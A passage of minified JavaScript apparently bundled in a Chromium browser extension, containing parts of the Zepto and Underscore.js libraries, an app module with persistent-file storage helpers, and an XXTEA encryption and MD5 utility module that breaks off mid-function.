            C.onreadystatechange = m,
            C.abort(),
            g(null, "timeout", C, v, w)
        },
        v.timeout)),
        C.send(v.data ? v.data: null),
        C
    },
    t.get = function() {
        return t.ajax(w.apply(null, arguments))
    },
    t.post = function() {
        var e = w.apply(null, arguments);
        return e.type = "POST",
        t.ajax(e)
    },
    t.getJSON = function() {
        var e = w.apply(null, arguments);
        return e.dataType = "json",
        t.ajax(e)
    },
    t.fn.load = function(e, n, r) {
        if (!this.length) return this;
        var o, a = this,
        u = e.split(/\s/),
        c = w(e, n, r),
        s = c.success;
        return u.length > 1 && (c.url = u[0], o = u[1]),
        c.success = function(e) {
            a.html(o ? t("<div>").html(e.replace(i, "")).find(o) : e),
            s && s.apply(a, arguments)
        },
        t.ajax(c),
        this
    };
    var b = encodeURIComponent;
    t.param = function(e, n) {
        var r = [];
        return r.add = function(e, n) {
            t.isFunction(n) && (n = n()),
            null == n && (n = ""),
            this.push(b(e) + "=" + b(n))
        },
        function e(n, r, o, i) {
            var a, u = t.isArray(r),
            c = t.isPlainObject(r);
            t.each(r,
            function(r, s) {
                a = t.type(s),
                i && (r = o ? i: i + "[" + (c || "object" == a || "array" == a ? r: "") + "]"),
                !i && u ? n.add(s.name, s.value) : "array" == a || !o && "object" == a ? e(n, s, o, r) : n.add(r, s)
            })
        } (r, e, n),
        r.join("&").replace(/%20/g, "+")
    }
} (Zepto),
function(t) {
    t.fn.serializeArray = function() {
        var e, n, r = [],
        o = function(t) {
            if (t.forEach) return t.forEach(o);
            r.push({
                name: e,
                value: t
            })
        };
        return this[0] && t.each(this[0].elements,
        function(r, i) {
            n = i.type,
            (e = i.name) && "fieldset" != i.nodeName.toLowerCase() && !i.disabled && "submit" != n && "reset" != n && "button" != n && "file" != n && ("radio" != n && "checkbox" != n || i.checked) && o(t(i).val())
        }),
        r
    },
    t.fn.serialize = function() {
        var t = [];
        return this.serializeArray().forEach(function(e) {
            t.push(encodeURIComponent(e.name) + "=" + encodeURIComponent(e.value))
        }),
        t.join("&")
    },
    t.fn.submit = function(e) {
        if (0 in arguments) this.bind("submit", e);
        else if (this.length) {
            var n = t.Event("submit");
            this.eq(0).trigger(n),
            n.isDefaultPrevented() || this.get(0).submit()
        }
        return this
    }
} (Zepto),
function(t) {
    "__proto__" in {} || t.extend(t.zepto, {
        Z: function(e, n) {
            return e = e || [],
            t.extend(e, t.fn),
            e.selector = n || "",
            e.__Z = !0,
            e
        },
        isZ: function(e) {
            return "array" === t.type(e) && "__Z" in e
        }
    });
    try {
        getComputedStyle(void 0)
    } catch(t) {
        var e = getComputedStyle;
        window.getComputedStyle = function(t) {
            try {
                return e(t)
            } catch(t) {
                return null
            }
        }
    }
} (Zepto),
define("lib/z", [],
function(t, e, n) {
    n.exports = window.Zepto
}),
function() {
    var t = this,
    e = t._,
    n = Array.prototype,
    r = Object.prototype,
    o = Function.prototype,
    i = n.push,
    a = n.slice,
    u = n.concat,
    c = r.toString,
    s = r.hasOwnProperty,
    l = Array.isArray,
    f = Object.keys,
    p = o.bind,
    h = function(t) {
        return t instanceof h ? t: this instanceof h ? void(this._wrapped = t) : new h(t)
    };
    "undefined" != typeof exports ? ("undefined" != typeof module && module.exports && (exports = module.exports = h), exports._ = h) : t._ = h,
    h.VERSION = "1.7.0";
    var d = function(t, e, n) {
        if (void 0 === e) return t;
        switch (null == n ? 3 : n) {
        case 1:
            return function(n) {
                return t.call(e, n)
            };
        case 2:
            return function(n, r) {
                return t.call(e, n, r)
            };
        case 3:
            return function(n, r, o) {
                return t.call(e, n, r, o)
            };
        case 4:
            return function(n, r, o, i) {
                return t.call(e, n, r, o, i)
            }
        }
        return function() {
            return t.apply(e, arguments)
        }
    };
    h.iteratee = function(t, e, n) {
        return null == t ? h.identity: h.isFunction(t) ? d(t, e, n) : h.isObject(t) ? h.matches(t) : h.property(t)
    },
    h.each = h.forEach = function(t, e, n) {
        if (null == t) return t;
        e = d(e, n);
        var r, o = t.length;
        if (o === +o) for (r = 0; r < o; r++) e(t[r], r, t);
        else {
            var i = h.keys(t);
            for (r = 0, o = i.length; r < o; r++) e(t[i[r]], i[r], t)
        }
        return t
    },
    h.map = h.collect = function(t, e, n) {
        if (null == t) return [];
        e = h.iteratee(e, n);
        for (var r, o = t.length !== +t.length && h.keys(t), i = (o || t).length, a = Array(i), u = 0; u < i; u++) r = o ? o[u] : u,
        a[u] = e(t[r], r, t);
        return a
    };
    var g = "Reduce of empty array with no initial value";
    h.reduce = h.foldl = h.inject = function(t, e, n, r) {
        null == t && (t = []),
        e = d(e, r, 4);
        var o, i = t.length !== +t.length && h.keys(t),
        a = (i || t).length,
        u = 0;
        if (arguments.length < 3) {
            if (!a) throw new TypeError(g);
            n = t[i ? i[u++] : u++]
        }
        for (; u < a; u++) n = e(n, t[o = i ? i[u] : u], o, t);
        return n
    },
    h.reduceRight = h.foldr = function(t, e, n, r) {
        null == t && (t = []),
        e = d(e, r, 4);
        var o, i = t.length !== +t.length && h.keys(t),
        a = (i || t).length;
        if (arguments.length < 3) {
            if (!a) throw new TypeError(g);
            n = t[i ? i[--a] : --a]
        }
        for (; a--;) n = e(n, t[o = i ? i[a] : a], o, t);
        return n
    },
    h.find = h.detect = function(t, e, n) {
        var r;
        return e = h.iteratee(e, n),
        h.some(t,
        function(t, n, o) {
            if (e(t, n, o)) return r = t,
            !0
        }),
        r
    },
    h.filter = h.select = function(t, e, n) {
        var r = [];
        return null == t ? r: (e = h.iteratee(e, n), h.each(t,
        function(t, n, o) {
            e(t, n, o) && r.push(t)
        }), r)
    },
    h.reject = function(t, e, n) {
        return h.filter(t, h.negate(h.iteratee(e)), n)
    },
    h.every = h.all = function(t, e, n) {
        if (null == t) return ! 0;
        e = h.iteratee(e, n);
        var r, o, i = t.length !== +t.length && h.keys(t),
        a = (i || t).length;
        for (r = 0; r < a; r++) if (!e(t[o = i ? i[r] : r], o, t)) return ! 1;
        return ! 0
    },
    h.some = h.any = function(t, e, n) {
        if (null == t) return ! 1;
        e = h.iteratee(e, n);
        var r, o, i = t.length !== +t.length && h.keys(t),
        a = (i || t).length;
        for (r = 0; r < a; r++) if (e(t[o = i ? i[r] : r], o, t)) return ! 0;
        return ! 1
    },
    h.contains = h.include = function(t, e) {
        return null != t && (t.length !== +t.length && (t = h.values(t)), h.indexOf(t, e) >= 0)
    },
    h.invoke = function(t, e) {
        var n = a.call(arguments, 2),
        r = h.isFunction(e);
        return h.map(t,
        function(t) {
            return (r ? e: t[e]).apply(t, n)
        })
    },
    h.pluck = function(t, e) {
        return h.map(t, h.property(e))
    },
    h.where = function(t, e) {
        return h.filter(t, h.matches(e))
    },
    h.findWhere = function(t, e) {
        return h.find(t, h.matches(e))
    },
    h.max = function(t, e, n) {
        var r, o, i = -1 / 0,
        a = -1 / 0;
        if (null == e && null != t) for (var u = 0,
        c = (t = t.length === +t.length ? t: h.values(t)).length; u < c; u++)(r = t[u]) > i && (i = r);
        else e = h.iteratee(e, n),
        h.each(t,
        function(t, n, r) { ((o = e(t, n, r)) > a || o === -1 / 0 && i === -1 / 0) && (i = t, a = o)
        });
        return i
    },
    h.min = function(t, e, n) {
        var r, o, i = 1 / 0,
        a = 1 / 0;
        if (null == e && null != t) for (var u = 0,
        c = (t = t.length === +t.length ? t: h.values(t)).length; u < c; u++)(r = t[u]) < i && (i = r);
        else e = h.iteratee(e, n),
        h.each(t,
        function(t, n, r) { ((o = e(t, n, r)) < a || o === 1 / 0 && i === 1 / 0) && (i = t, a = o)
        });
        return i
    },
    h.shuffle = function(t) {
        for (var e, n = t && t.length === +t.length ? t: h.values(t), r = n.length, o = Array(r), i = 0; i < r; i++)(e = h.random(0, i)) !== i && (o[i] = o[e]),
        o[e] = n[i];
        return o
    },
    h.sample = function(t, e, n) {
        return null == e || n ? (t.length !== +t.length && (t = h.values(t)), t[h.random(t.length - 1)]) : h.shuffle(t).slice(0, Math.max(0, e))
    },
    h.sortBy = function(t, e, n) {
        return e = h.iteratee(e, n),
        h.pluck(h.map(t,
        function(t, n, r) {
            return {
                value: t,
                index: n,
                criteria: e(t, n, r)
            }
        }).sort(function(t, e) {
            var n = t.criteria,
            r = e.criteria;
            if (n !== r) {
                if (n > r || void 0 === n) return 1;
                if (n < r || void 0 === r) return - 1
            }
            return t.index - e.index
        }), "value")
    };
    var v = function(t) {
        return function(e, n, r) {
            var o = {};
            return n = h.iteratee(n, r),
            h.each(e,
            function(r, i) {
                var a = n(r, i, e);
                t(o, r, a)
            }),
            o
        }
    };
    h.groupBy = v(function(t, e, n) {
        h.has(t, n) ? t[n].push(e) : t[n] = [e]
    }),
    h.indexBy = v(function(t, e, n) {
        t[n] = e
    }),
    h.countBy = v(function(t, e, n) {
        h.has(t, n) ? t[n]++:t[n] = 1
    }),
    h.sortedIndex = function(t, e, n, r) {
        for (var o = (n = h.iteratee(n, r, 1))(e), i = 0, a = t.length; i < a;) {
            var u = i + a >>> 1;
            n(t[u]) < o ? i = u + 1 : a = u
        }
        return i
    },
    h.toArray = function(t) {
        return t ? h.isArray(t) ? a.call(t) : t.length === +t.length ? h.map(t, h.identity) : h.values(t) : []
    },
    h.size = function(t) {
        return null == t ? 0 : t.length === +t.length ? t.length: h.keys(t).length
    },
    h.partition = function(t, e, n) {
        e = h.iteratee(e, n);
        var r = [],
        o = [];
        return h.each(t,
        function(t, n, i) { (e(t, n, i) ? r: o).push(t)
        }),
        [r, o]
    },
    h.first = h.head = h.take = function(t, e, n) {
        if (null != t) return null == e || n ? t[0] : e < 0 ? [] : a.call(t, 0, e)
    },
    h.initial = function(t, e, n) {
        return a.call(t, 0, Math.max(0, t.length - (null == e || n ? 1 : e)))
    },
    h.last = function(t, e, n) {
        if (null != t) return null == e || n ? t[t.length - 1] : a.call(t, Math.max(t.length - e, 0))
    },
    h.rest = h.tail = h.drop = function(t, e, n) {
        return a.call(t, null == e || n ? 1 : e)
    },
    h.compact = function(t) {
        return h.filter(t, h.identity)
    };
    var m = function(t, e, n, r) {
        if (e && h.every(t, h.isArray)) return u.apply(r, t);
        for (var o = 0,
        a = t.length; o < a; o++) {
            var c = t[o];
            h.isArray(c) || h.isArguments(c) ? e ? i.apply(r, c) : m(c, e, n, r) : n || r.push(c)
        }
        return r
    };
    h.flatten = function(t, e) {
        return m(t, e, !1, [])
    },
    h.without = function(t) {
        return h.difference(t, a.call(arguments, 1))
    },
    h.uniq = h.unique = function(t, e, n, r) {
        if (null == t) return [];
        h.isBoolean(e) || (r = n, n = e, e = !1),
        null != n && (n = h.iteratee(n, r));
        for (var o = [], i = [], a = 0, u = t.length; a < u; a++) {
            var c = t[a];
            if (e) a && i === c || o.push(c),
            i = c;
            else if (n) {
                var s = n(c, a, t);
                h.indexOf(i, s) < 0 && (i.push(s), o.push(c))
            } else h.indexOf(o, c) < 0 && o.push(c)
        }
        return o
    },
    h.union = function() {
        return h.uniq(m(arguments, !0, !0, []))
    },
    h.intersection = function(t) {
        if (null == t) return [];
        for (var e = [], n = arguments.length, r = 0, o = t.length; r < o; r++) {
            var i = t[r];
            if (!h.contains(e, i)) {
                for (var a = 1; a < n && h.contains(arguments[a], i); a++);
                a === n && e.push(i)
            }
        }
        return e
    },
    h.difference = function(t) {
        var e = m(a.call(arguments, 1), !0, !0, []);
        return h.filter(t,
        function(t) {
            return ! h.contains(e, t)
        })
    },
    h.zip = function(t) {
        if (null == t) return [];
        for (var e = h.max(arguments, "length").length, n = Array(e), r = 0; r < e; r++) n[r] = h.pluck(arguments, r);
        return n
    },
    h.object = function(t, e) {
        if (null == t) return {};
        for (var n = {},
        r = 0,
        o = t.length; r < o; r++) e ? n[t[r]] = e[r] : n[t[r][0]] = t[r][1];
        return n
    },
    h.indexOf = function(t, e, n) {
        if (null == t) return - 1;
        var r = 0,
        o = t.length;
        if (n) {
            if ("number" != typeof n) return t[r = h.sortedIndex(t, e)] === e ? r: -1;
            r = n < 0 ? Math.max(0, o + n) : n
        }
        for (; r < o; r++) if (t[r] === e) return r;
        return - 1
    },
    h.lastIndexOf = function(t, e, n) {
        if (null == t) return - 1;
        var r = t.length;
        for ("number" == typeof n && (r = n < 0 ? r + n + 1 : Math.min(r, n + 1)); --r >= 0;) if (t[r] === e) return r;
        return - 1
    },
    h.range = function(t, e, n) {
        arguments.length <= 1 && (e = t || 0, t = 0),
        n = n || 1;
        for (var r = Math.max(Math.ceil((e - t) / n), 0), o = Array(r), i = 0; i < r; i++, t += n) o[i] = t;
        return o
    };
    var y = function() {};
    h.bind = function(t, e) {
        var n, r;
        if (p && t.bind === p) return p.apply(t, a.call(arguments, 1));
        if (!h.isFunction(t)) throw new TypeError("Bind must be called on a function");
        return n = a.call(arguments, 2),
        r = function() {
            if (! (this instanceof r)) return t.apply(e, n.concat(a.call(arguments)));
            y.prototype = t.prototype;
            var o = new y;
            y.prototype = null;
            var i = t.apply(o, n.concat(a.call(arguments)));
            return h.isObject(i) ? i: o
        }
    },
    h.partial = function(t) {
        var e = a.call(arguments, 1);
        return function() {
            for (var n = 0,
            r = e.slice(), o = 0, i = r.length; o < i; o++) r[o] === h && (r[o] = arguments[n++]);
            for (; n < arguments.length;) r.push(arguments[n++]);
            return t.apply(this, r)
        }
    },
    h.bindAll = function(t) {
        var e, n, r = arguments.length;
        if (r <= 1) throw new Error("bindAll must be passed function names");
        for (e = 1; e < r; e++) t[n = arguments[e]] = h.bind(t[n], t);
        return t
    },
    h.memoize = function(t, e) {
        var n = function(r) {
            var o = n.cache,
            i = e ? e.apply(this, arguments) : r;
            return h.has(o, i) || (o[i] = t.apply(this, arguments)),
            o[i]
        };
        return n.cache = {},
        n
    },
    h.delay = function(t, e) {
        var n = a.call(arguments, 2);
        return setTimeout(function() {
            return t.apply(null, n)
        },
        e)
    },
    h.defer = function(t) {
        return h.delay.apply(h, [t, 1].concat(a.call(arguments, 1)))
    },
    h.throttle = function(t, e, n) {
        var r, o, i, a = null,
        u = 0;
        n || (n = {});
        var c = function() {
            u = !1 === n.leading ? 0 : h.now(),
            a = null,
            i = t.apply(r, o),
            a || (r = o = null)
        };
        return function() {
            var s = h.now();
            u || !1 !== n.leading || (u = s);
            var l = e - (s - u);
            return r = this,
            o = arguments,
            l <= 0 || l > e ? (clearTimeout(a), a = null, u = s, i = t.apply(r, o), a || (r = o = null)) : a || !1 === n.trailing || (a = setTimeout(c, l)),
            i
        }
    },
    h.debounce = function(t, e, n) {
        var r, o, i, a, u, c = function() {
            var s = h.now() - a;
            s < e && s > 0 ? r = setTimeout(c, e - s) : (r = null, n || (u = t.apply(i, o), r || (i = o = null)))
        };
        return function() {
            i = this,
            o = arguments,
            a = h.now();
            var s = n && !r;
            return r || (r = setTimeout(c, e)),
            s && (u = t.apply(i, o), i = o = null),
            u
        }
    },
    h.wrap = function(t, e) {
        return h.partial(e, t)
    },
    h.negate = function(t) {
        return function() {
            return ! t.apply(this, arguments)
        }
    },
    h.compose = function() {
        var t = arguments,
        e = t.length - 1;
        return function() {
            for (var n = e,
            r = t[e].apply(this, arguments); n--;) r = t[n].call(this, r);
            return r
        }
    },
    h.after = function(t, e) {
        return function() {
            if (--t < 1) return e.apply(this, arguments)
        }
    },
    h.before = function(t, e) {
        var n;
        return function() {
            return--t > 0 ? n = e.apply(this, arguments) : e = null,
            n
        }
    },
    h.once = h.partial(h.before, 2),
    h.keys = function(t) {
        if (!h.isObject(t)) return [];
        if (f) return f(t);
        var e = [];
        for (var n in t) h.has(t, n) && e.push(n);
        return e
    },
    h.values = function(t) {
        for (var e = h.keys(t), n = e.length, r = Array(n), o = 0; o < n; o++) r[o] = t[e[o]];
        return r
    },
    h.pairs = function(t) {
        for (var e = h.keys(t), n = e.length, r = Array(n), o = 0; o < n; o++) r[o] = [e[o], t[e[o]]];
        return r
    },
    h.invert = function(t) {
        for (var e = {},
        n = h.keys(t), r = 0, o = n.length; r < o; r++) e[t[n[r]]] = n[r];
        return e
    },
    h.functions = h.methods = function(t) {
        var e = [];
        for (var n in t) h.isFunction(t[n]) && e.push(n);
        return e.sort()
    },
    h.extend = function(t) {
        if (!h.isObject(t)) return t;
        for (var e, n, r = 1,
        o = arguments.length; r < o; r++) for (n in e = arguments[r]) s.call(e, n) && (t[n] = e[n]);
        return t
    },
    h.pick = function(t, e, n) {
        var r, o = {};
        if (null == t) return o;
        if (h.isFunction(e)) for (r in e = d(e, n), t) {
            var i = t[r];
            e(i, r, t) && (o[r] = i)
        } else {
            var c = u.apply([], a.call(arguments, 1));
            t = new Object(t);
            for (var s = 0,
            l = c.length; s < l; s++)(r = c[s]) in t && (o[r] = t[r])
        }
        return o
    },
    h.omit = function(t, e, n) {
        if (h.isFunction(e)) e = h.negate(e);
        else {
            var r = h.map(u.apply([], a.call(arguments, 1)), String);
            e = function(t, e) {
                return ! h.contains(r, e)
            }
        }
        return h.pick(t, e, n)
    },
    h.defaults = function(t) {
        if (!h.isObject(t)) return t;
        for (var e = 1,
        n = arguments.length; e < n; e++) {
            var r = arguments[e];
            for (var o in r) void 0 === t[o] && (t[o] = r[o])
        }
        return t
    },
    h.clone = function(t) {
        return h.isObject(t) ? h.isArray(t) ? t.slice() : h.extend({},
        t) : t
    },
    h.tap = function(t, e) {
        return e(t),
        t
    };
    var w = function(t, e, n, r) {
        if (t === e) return 0 !== t || 1 / t == 1 / e;
        if (null == t || null == e) return t === e;
        t instanceof h && (t = t._wrapped),
        e instanceof h && (e = e._wrapped);
        var o = c.call(t);
        if (o !== c.call(e)) return ! 1;
        switch (o) {
        case "[object RegExp]":
        case "[object String]":
            return "" + t == "" + e;
        case "[object Number]":
            return + t != +t ? +e != +e: 0 == +t ? 1 / +t == 1 / e: +t == +e;
        case "[object Date]":
        case "[object Boolean]":
            return + t == +e
        }
        if ("object" != typeof t || "object" != typeof e) return ! 1;
        for (var i = n.length; i--;) if (n[i] === t) return r[i] === e;
        var a, u, s = t.constructor,
        l = e.constructor;
        if (s !== l && "constructor" in t && "constructor" in e && !(h.isFunction(s) && s instanceof s && h.isFunction(l) && l instanceof l)) return ! 1;
        if (n.push(t), r.push(e), "[object Array]" === o) {
            if (u = (a = t.length) === e.length) for (; a--&&(u = w(t[a], e[a], n, r)););
        } else {
            var f, p = h.keys(t);
            if (a = p.length, u = h.keys(e).length === a) for (; a--&&(f = p[a], u = h.has(e, f) && w(t[f], e[f], n, r)););
        }
        return n.pop(),
        r.pop(),
        u
    };
    h.isEqual = function(t, e) {
        return w(t, e, [], [])
    },
    h.isEmpty = function(t) {
        if (null == t) return ! 0;
        if (h.isArray(t) || h.isString(t) || h.isArguments(t)) return 0 === t.length;
        for (var e in t) if (h.has(t, e)) return ! 1;
        return ! 0
    },
    h.isElement = function(t) {
        return ! (!t || 1 !== t.nodeType)
    },
    h.isArray = l ||
    function(t) {
        return "[object Array]" === c.call(t)
    },
    h.isObject = function(t) {
        var e = typeof t;
        return "function" === e || "object" === e && !!t
    },
    h.each(["Arguments", "Function", "String", "Number", "Date", "RegExp"],
    function(t) {
        h["is" + t] = function(e) {
            return c.call(e) === "[object " + t + "]"
        }
    }),
    h.isArguments(arguments) || (h.isArguments = function(t) {
        return h.has(t, "callee")
    }),
    "function" != typeof / . / &&(h.isFunction = function(t) {
        return "function" == typeof t || !1
    }),
    h.isFinite = function(t) {
        return isFinite(t) && !isNaN(parseFloat(t))
    },
    h.isNaN = function(t) {
        return h.isNumber(t) && t !== +t
    },
    h.isBoolean = function(t) {
        return ! 0 === t || !1 === t || "[object Boolean]" === c.call(t)
    },
    h.isNull = function(t) {
        return null === t
    },
    h.isUndefined = function(t) {
        return void 0 === t
    },
    h.has = function(t, e) {
        return null != t && s.call(t, e)
    },
    h.noConflict = function() {
        return t._ = e,
        this
    },
    h.identity = function(t) {
        return t
    },
    h.constant = function(t) {
        return function() {
            return t
        }
    },
    h.noop = function() {},
    h.property = function(t) {
        return function(e) {
            return e[t]
        }
    },
    h.matches = function(t) {
        var e = h.pairs(t),
        n = e.length;
        return function(t) {
            if (null == t) return ! n;
            t = new Object(t);
            for (var r = 0; r < n; r++) {
                var o = e[r],
                i = o[0];
                if (o[1] !== t[i] || !(i in t)) return ! 1
            }
            return ! 0
        }
    },
    h.times = function(t, e, n) {
        var r = Array(Math.max(0, t));
        e = d(e, n, 1);
        for (var o = 0; o < t; o++) r[o] = e(o);
        return r
    },
    h.random = function(t, e) {
        return null == e && (e = t, t = 0),
        t + Math.floor(Math.random() * (e - t + 1))
    },
    h.now = Date.now ||
    function() {
        return (new Date).getTime()
    };
    var b = {
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "&#x27;",
        "`": "&#x60;"
    },
    x = h.invert(b),
    S = function(t) {
        var e = function(e) {
            return t[e]
        },
        n = "(?:" + h.keys(t).join("|") + ")",
        r = RegExp(n),
        o = RegExp(n, "g");
        return function(t) {
            return t = null == t ? "": "" + t,
            r.test(t) ? t.replace(o, e) : t
        }
    };
    h.escape = S(b),
    h.unescape = S(x),
    h.result = function(t, e) {
        if (null != t) {
            var n = t[e];
            return h.isFunction(n) ? t[e]() : n
        }
    };
    var E = 0;
    h.uniqueId = function(t) {
        var e = ++E + "";
        return t ? t + e: e
    },
    h.templateSettings = {
        evaluate: /<%([\s\S]+?)%>/g,
        interpolate: /<%=([\s\S]+?)%>/g,
        escape: /<%-([\s\S]+?)%>/g
    };
    var T = /(.)^/,
    j = {
        "'": "'",
        "\\": "\\",
        "\r": "r",
        "\n": "n",
        "\u2028": "u2028",
        "\u2029": "u2029"
    },
    O = /\\|'|\r|\n|\u2028|\u2029/g,
    C = function(t) {
        return "\\" + j[t]
    };
    h.template = function(t, e, n) { ! e && n && (e = n),
        e = h.defaults({},
        e, h.templateSettings);
        var r = RegExp([(e.escape || T).source, (e.interpolate || T).source, (e.evaluate || T).source].join("|") + "|$", "g"),
        o = 0,
        i = "__p+='";
        t.replace(r,
        function(e, n, r, a, u) {
            return i += t.slice(o, u).replace(O, C),
            o = u + e.length,
            n ? i += "'+\n((__t=(" + n + "))==null?'':_.escape(__t))+\n'": r ? i += "'+\n((__t=(" + r + "))==null?'':__t)+\n'": a && (i += "';\n" + a + "\n__p+='"),
            e
        }),
        i += "';\n",
        e.variable || (i = "with(obj||{}){\n" + i + "}\n"),
        i = "var __t,__p='',__j=Array.prototype.join,print=function(){__p+=__j.call(arguments,'');};\n" + i + "return __p;\n";
        try {
            var a = new Function(e.variable || "obj", "_", i)
        } catch(t) {
            throw t.source = i,
            t
        }
        var u = function(t) {
            return a.call(this, t, h)
        },
        c = e.variable || "obj";
        return u.source = "function(" + c + "){\n" + i + "}",
        u
    },
    h.chain = function(t) {
        var e = h(t);
        return e._chain = !0,
        e
    };
    var A = function(t) {
        return this._chain ? h(t).chain() : t
    };
    h.mixin = function(t) {
        h.each(h.functions(t),
        function(e) {
            var n = h[e] = t[e];
            h.prototype[e] = function() {
                var t = [this._wrapped];
                return i.apply(t, arguments),
                A.call(this, n.apply(h, t))
            }
        })
    },
    h.mixin(h),
    h.each(["pop", "push", "reverse", "shift", "sort", "splice", "unshift"],
    function(t) {
        var e = n[t];
        h.prototype[t] = function() {
            var n = this._wrapped;
            return e.apply(n, arguments),
            "shift" !== t && "splice" !== t || 0 !== n.length || delete n[0],
            A.call(this, n)
        }
    }),
    h.each(["concat", "join", "slice"],
    function(t) {
        var e = n[t];
        h.prototype[t] = function() {
            return A.call(this, e.apply(this._wrapped, arguments))
        }
    }),
    h.prototype.value = function() {
        return this._wrapped
    },
    define("lib/u", [],
    function(t, e, n) {
        n.exports = h
    })
}.call(this),
define("app/u", [],
function(t, e) {
    t("lib/z");
    e.info = {
        appID: chrome.i18n.getMessage("@@extension_id"),
        appVersion: chrome.runtime.getManifest().version,
        platform: "chromium",
        locale: "zh-cn",
        rootServer: localStorage.rootServer,
        platformVersion: function() {
            var t = /\bChrome\/(\S+)/.exec(navigator.userAgent);
            return t ? t[1] : "0"
        },
        appStartTime: Date.now()
    },
    e.onlineTime = function(t) {
        t((new Date).toISOString().substr(0, 19).replace(/-/g, "").replace(/:/g, ""))
    },
    e.offlineTime = function() {
        return (new Date).toISOString().substr(0, 19).replace(/-/g, "").replace(/:/g, "")
    },
    e.IO = {
        _MAXSPACE: 104857600,
        G: function(t, e, n, r) { (window.requestFileSystem || window.webkitRequestFileSystem)(window.PERSISTENT, this._MAXSPACE,
            function(o) {
                o.root.getFile(t, {
                    create: e
                },
                function(t) {
                    n(o, t)
                },
                r)
            },
            r)
        },
        R: function(t, e, n) {
            this.G(t, !1,
            function(t, r) {
                r.file(function(t) {
                    var n = new FileReader;
                    n.onloadend = function() {
                        e(n.result)
                    },
                    n.readAsText(t)
                },
                n)
            },
            n)
        },
        W: function(t, n, r, o) {
            var i = function(t, n, r, o) {
                e.IO.G(t, !0,
                function(t, e) {
                    e.createWriter(function(t) {
                        t.onwriteend = r,
                        t.onerror = o;
                        var e = new Blob([n], {
                            type: "text/plain"
                        });
                        t.write(e)
                    },
                    o)
                },
                o)
            };
            this.D(t,
            function() {
                i(t, n, r, o)
            },
            function() {
                i(t, n, r, o)
            })
        },
        D: function(t, e, n) {
            this.G(t, !1,
            function(t, r) {
                r.remove(function() {
                    e()
                },
                n)
            },
            n)
        },
        E: function(t, e) {
            this.G(fileName, !1,
            function() {
                e(!0)
            },
            function() {
                e(!1)
            })
        }
    }
}),
define("lib/t", [],
function(t, e, n) {
    "use strict";
    var r = {
        E: function(t, e) {
            if (t = String(t), e = String(e), 0 == t.length) return "";
            var n = r.strToLongs(t.utf8Encode()),
            o = r.strToLongs(e.utf8Encode().slice(0, 16));
            n.length;
            return n = r.encode(n, o),
            r.longsToStr(n).base64Encode()
        },
        D: function(t, e) {
            if (t = String(t), e = String(e), 0 == t.length) return "";
            var n = r.strToLongs(t.base64Decode()),
            o = r.strToLongs(e.utf8Encode().slice(0, 16));
            n.length;
            n = r.decode(n, o);
            var i = r.longsToStr(n);
            return (i = i.replace(/\0+$/, "")).utf8Decode()
        },
        encode: function(t, e) {
            t.length < 2 && (t[1] = 0);
            for (var n, r, o = t.length,
            i = t[o - 1], a = t[0], u = Math.floor(6 + 52 / o), c = 0; u-->0;) {
                r = (c += 2654435769) >>> 2 & 3;
                for (var s = 0; s < o; s++) n = (i >>> 5 ^ (a = t[(s + 1) % o]) << 2) + (a >>> 3 ^ i << 4) ^ (c ^ a) + (e[3 & s ^ r] ^ i),
                i = t[s] += n
            }
            return t
        },
        decode: function(t, e) {
            for (var n, r, o = t.length,
            i = t[o - 1], a = t[0], u = 2654435769 * Math.floor(6 + 52 / o); 0 != u;) {
                r = u >>> 2 & 3;
                for (var c = o - 1; c >= 0; c--) n = ((i = t[c > 0 ? c - 1 : o - 1]) >>> 5 ^ a << 2) + (a >>> 3 ^ i << 4) ^ (u ^ a) + (e[3 & c ^ r] ^ i),
                a = t[c] -= n;
                u -= 2654435769
            }
            return t
        },
        strToLongs: function(t) {
            for (var e = new Array(Math.ceil(t.length / 4)), n = 0; n < e.length; n++) e[n] = t.charCodeAt(4 * n) + (t.charCodeAt(4 * n + 1) << 8) + (t.charCodeAt(4 * n + 2) << 16) + (t.charCodeAt(4 * n + 3) << 24);
            return e
        },
        longsToStr: function(t) {
            for (var e = new Array(t.length), n = 0; n < t.length; n++) e[n] = String.fromCharCode(255 & t[n], t[n] >>> 8 & 255, t[n] >>> 16 & 255, t[n] >>> 24 & 255);
            return e.join("")
        }
    };
    void 0 === String.prototype.utf8Encode && (String.prototype.utf8Encode = function() {
        return unescape(encodeURIComponent(this))
    }),
    void 0 === String.prototype.utf8Decode && (String.prototype.utf8Decode = function() {
        try {
            return decodeURIComponent(escape(this))
        } catch(t) {
            return this
        }
    }),
    void 0 === String.prototype.base64Encode && (String.prototype.base64Encode = function() {
        return this
    }),
    void 0 === String.prototype.base64Decode && (String.prototype.base64Decode = function() {
        return this
    }),
    r.P = function(t, e) {
        for (var n = (t + e).replace("T", ""), r = [], o = 0; o < 16; o++) r.push(String.fromCharCode(parseInt(n.charCodeAt(o) + n.charCodeAt(o + 16) + n.charCodeAt(o + 32)) / 3));
        return r.join("")
    },
    r.G = function() {
        function t() {
            return Math.floor(65536 * (1 + Math.random())).toString(16).substring(1)
        }
        return t() + t() + "-" + t() + "-" + t() + "-" + t() + "-" + t() + t() + t()
    },
    r.M = function(t) {
        function e(t, e) {
            var n = t[0],
            u = t[1],
            c = t[2],
            s = t[3];
            u = a(u = a(u = a(u = a(u = i(u = i(u = i(u = i(u = o(u = o(u = o(u = o(u = r(u = r(u = r(u = r(u, c = r(c, s = r(s, n = r(n, u, c, s, e[0], 7, -680876936), u, c, e[1], 12, -389564586), n, u, e[2], 17, 606105819), s, n, e[3], 22, -1044525330), c = r(c, s = r(s, n = r(n, u, c, s, e[4], 7, -176418897), u, c, e[5], 12, 1200080426), n, u, e[6], 17, -1473231341), s, n, e[7], 22, -45705983), c = r(c, s = r(s, n = r(n, u, c, s, e[8], 7, 1770035416), u, c, e[9], 12, -1958414417), n, u, e[10], 17, -42063), s, n, e[11], 22, -1990404162), c = r(c, s = r(s, n = r(n, u, c, s, e[12], 7, 1804603682), u, c, e[13], 12, -40341101), n, u, e[14], 17, -1502002290), s, n, e[15], 22, 1236535329), c = o(c, s = o(s, n = o(n, u, c, s, e[1], 5, -165796510), u, c, e[6], 9, -1069501632), n, u, e[11], 14, 643717713), s, n, e[0], 20, -373897302), c = o(c, s = o(s, n = o(n, u, c, s, e[5], 5, -701558691), u, c, e[10], 9, 38016083), n, u, e[15], 14, -660478335), s, n, e[4], 20, -405537848), c = o(c, s = o(s, n = o(n, u, c, s, e[9], 5, 568446438), u, c, e[14], 9, -1019803690), n, u, e[3], 14, -187363961), s, n, e[8], 20, 1163531501), c = o(c, s = o(s, n = 